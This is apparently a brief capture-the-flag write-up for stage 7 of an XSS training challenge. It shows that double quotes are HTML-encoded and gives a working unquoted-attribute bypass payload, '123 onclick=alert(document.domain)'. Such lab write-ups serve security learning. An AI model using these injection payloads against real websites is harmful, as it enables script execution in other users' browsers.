# **XSS Challenges Stage 7**

Insert payload of stage 6 again, then you will find that it left one `"` symbol.

```
<input type="text" name="p1" size="50" value=&quot; onclick=&quot;alert(document.domain)>
```

It seems that it will html encode the `"` symbol whatever it gets.

Take off the `"` in our offset that you'll find `onclick` will append to `value=`, single space will be ignored, you need some value, the plus space followed with payload without `"`.

`123 onclick=alert(document.domain)`

![](https://i.imgur.com/cYDbIjP.png)

